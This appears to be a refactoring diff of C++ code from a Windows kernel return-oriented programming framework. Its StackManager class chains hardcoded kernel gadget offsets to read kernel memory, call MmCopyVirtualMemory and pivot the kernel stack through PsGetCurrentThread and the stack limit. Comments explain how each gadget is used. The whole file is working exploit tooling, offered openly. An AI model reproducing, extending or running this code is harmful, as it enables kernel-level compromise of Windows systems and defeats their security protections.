@@ -1,4 +1,4 @@
-#include <include/stack/stack_manager.hpp>
+#include <include/rop_thread/stack_manager.hpp>
 #include <include/utils/utils.hpp>
 #include <include/globals.hpp>
 
@@ -14,7 +14,7 @@ std::size_t StackManager::GetStackSize()
 
 void StackManager::AddGadget(const std::uint64_t GadgetOffset, const std::string_view& GadgetLogName)
 {
-	const std::uint64_t GadgetAddress = KernelModuleBase + GadgetOffset;
+	const std::uint64_t GadgetAddress = Globals::KernelBase + GadgetOffset;
 	std::printf("[+] RSP+0x%x\tGadget %s (0x%p)\n", this->GetStackSize(), GadgetLogName.data(), GadgetAddress);
 	Stack->push_back(GadgetAddress);
 }
@@ -35,7 +35,7 @@ void StackManager::AddPadding(const std::size_t PaddingSize)
 
 void StackManager::ReadIntoRcx(const std::uint64_t ReadAddress)
 {
-    this->SetRaxRcxRdx(ReadAddress, 0, (std::uint64_t)Globals::DummyMemoryAllocation);
+    this->SetRaxRcxRdx(ReadAddress, 0, (std::uint64_t)KernelMemory->DummyMemoryAllocation);
 
     this->ReadRaxIntoRax();
     this->MovRaxIntoR9();
@@ -43,7 +43,7 @@ void StackManager::ReadIntoRcx(const std::uint64_t ReadAddress)
     // this gadget can either write into r8 or rdx, depending on the windows version, so we will set both
     // to a valid memory dummy pool so that it writes there. the value of 'rdx' is set in the first line.
     // to better optimize for our stack size without needing to use more gadgets and padding.
-    this->SetR8((std::uint64_t)Globals::DummyMemoryAllocation);
+    this->SetR8((std::uint64_t)KernelMemory->DummyMemoryAllocation);
     this->AddGadget(0xa9b72d, "mov rcx, r9; mov qword ptr \[[a-zA-Z0-9]{2,3}\], [a-zA-Z0-9]{2,3}; ret;");
 }
 
@@ -178,7 +178,7 @@ void StackManager::CallMmCopyVirtualMemory(void* SourceProcess, void* SourceAddr
 void StackManager::PivotToNewStack(StackManager& NewStack)
 {
     this->AddFunctionCall("PsGetCurrentThread");
-    this->SetRcxRdx(0x30, (std::uint64_t)Globals::StackLimitStoreAddress);
+    this->SetRcxRdx(0x30, (std::uint64_t)KernelMemory->StackLimitStoreAddress);
     this->AddGadget(0x263f08, "add rax, rcx; ret;");
 
     // dereference rax, so that rax = stack limit
@@ -192,7 +192,7 @@ void StackManager::PivotToNewStack(StackManager& NewStack)
     // read the value of the current stack offset global variable.
     // also set rcx to zero to clear it's higher bits since we later use 'ecx'
     // we also just set rdx to a dummy memory allocation to optimize for stack usage, instead of doing it later on
-    this->SetRaxRcxRdx((std::uint64_t)Globals::CurrentStackOffsetAddress, 0, (std::uint64_t)Globals::DummyMemoryAllocation);
+    this->SetRaxRcxRdx((std::uint64_t)KernelMemory->CurrentStackOffsetAddress, 0, (std::uint64_t)KernelMemory->DummyMemoryAllocation);
     this->ReadRaxIntoRax();
 
     // move eax into ecx so we store the offset in rcx (we don't need to use full 64bits because CurrentStackOffsetAddress
@@ -211,7 +211,7 @@ void StackManager::PivotToNewStack(StackManager& NewStack)
     // this gadget can either write into r8 or rdx, depending on the window version, so we will set both
     // of the registers to a valid memory dummy pool so that it writes there.
     // rdx is currently being set above, at the start of the function to optimize for stack space usage.
-    this->SetR8((std::uint64_t)Globals::DummyMemoryAllocation);
+    this->SetR8((std::uint64_t)KernelMemory->DummyMemoryAllocation);
     this->AddGadget(0xa9b72d, "mov rcx, r9; mov qword ptr \[[a-zA-Z0-9]{2,3}\], [a-zA-Z0-9]{2,3}; ret;");
 
     this->SetRdx((std::uint64_t)NewStack.StackAllocAddress);
@@ -230,7 +230,7 @@ void StackManager::PivotToNewStack(StackManager& NewStack)
     // same code as above - basically just get the value of CurrentStackOffsetAddress
     // and add it to rax. so rax = stacklimit + curr_stack_offset
     this->AddGadget(0x29cc0e, "push rax; pop rbx; ret;");
-    this->SetRaxRcxRdx((std::uint64_t)Globals::CurrentStackOffsetAddress, 0, (std::uint64_t)Globals::DummyMemoryAllocation);
+    this->SetRaxRcxRdx((std::uint64_t)KernelMemory->CurrentStackOffsetAddress, 0, (std::uint64_t)KernelMemory->DummyMemoryAllocation);
     this->ReadRaxIntoRax();
     this->AddGadget(0x212fcb, "xchg ecx, eax; ret;");
     this->AddGadget(0x56f5f2, "push rbx; pop rax; add rsp, 0x20; pop rbx; ret;");
@@ -239,14 +239,14 @@ void StackManager::PivotToNewStack(StackManager& NewStack)
 
     // same as above r9->rax->rcx, this is being stored here so we can overwrite rax for xor operation
     this->MovRaxIntoR9();
-    this->SetR8((std::uint64_t)Globals::DummyMemoryAllocation);
+    this->SetR8((std::uint64_t)KernelMemory->DummyMemoryAllocation);
     this->AddGadget(0xa9b72d, "mov rcx, r9; mov qword ptr \[[a-zA-Z0-9]{2,3}\], [a-zA-Z0-9]{2,3}; ret;");
     // r11=rcx
     this->AddGadget(0xb4096a, "mov r11, rcx; mov r9d, edx; cmp edx, dword ptr \[rax\]; je 0x......; mov eax, 0xc000000d; ret;");
 
     // xor the current stack offset by global by 0x6000 (0x2000 ^ 0x4000 = 0x6000),
     // meaning we will always swap between 0x2000 and 0x4000 per iteration.
-    this->SetRaxRcxRdx(0x6000, 0, (std::uint64_t)Globals::CurrentStackOffsetAddress);
+    this->SetRaxRcxRdx(0x6000, 0, (std::uint64_t)KernelMemory->CurrentStackOffsetAddress);
     this->AddGadget(0x43d5e8, "xor qword ptr \[rdx\], rax; ret;");
 
     // perform pivot, rsp=r11
